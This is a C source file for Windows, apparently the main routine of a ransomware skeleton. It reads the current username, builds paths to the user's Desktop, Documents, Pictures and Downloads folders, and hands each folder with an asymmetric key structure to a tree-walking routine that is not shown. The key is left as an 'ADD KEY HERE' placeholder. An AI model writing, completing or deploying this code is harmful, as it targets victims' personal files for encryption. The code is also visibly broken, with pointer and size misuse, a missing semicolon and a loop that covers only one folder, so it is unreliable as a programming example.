#include <stdio.h>
#include <Windows.h>
#include "keyDef.h"
#include "getTree.h"



int main() {

	// Setting variables
	char initialPath[] = "C:\\Users\\";
	char targetDirs[4][10] = {"Desktop", "Documents", "Pictures", "Downloads"};
	BYTE asymKeyData[] = //ADD KEY HERE

	// Initialize keys
	key keyStruct = setupKeys();

	// Get size of windows username 
	LPDWORD userLenCheck = NULL;
	GetUserNameA(NULL, &userLenCheck);
	
	// Get windows username for path
	char* userName = (char*)malloc(userLenCheck + 1);
	DWORD userLen = userLenCheck + 1;
	if (!GetUserNameA(userName, &userLen)) {
		printf("\n(!) Failed to get username - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully got username %s", userName);
	}

	// Iterate through target directories and get tree of folders
	for (int i = 0; i < 1; i++) {

		int pathLen = strlen(initialPath) + userName + strlen(targetDirs[i]) + 2;
		char* path = (char*)malloc(pathLen);
		strcpy_s(path, pathLen, initialPath);
		strcat_s(path, pathLen, userName);
		strcat_s(path, pathLen, "\\");
		strcat_s(path, pathLen, targetDirs[i]);
		getTree(path, keyStruct);

		if (i != 3) {
			memset(path, 0, pathLen);
		} else {
			free(path);
		}
	}

	// Cleaning up buffer and keys
	free(userName);
	keyCleanup(keyStruct, asymKeyData);

	return 0;
}


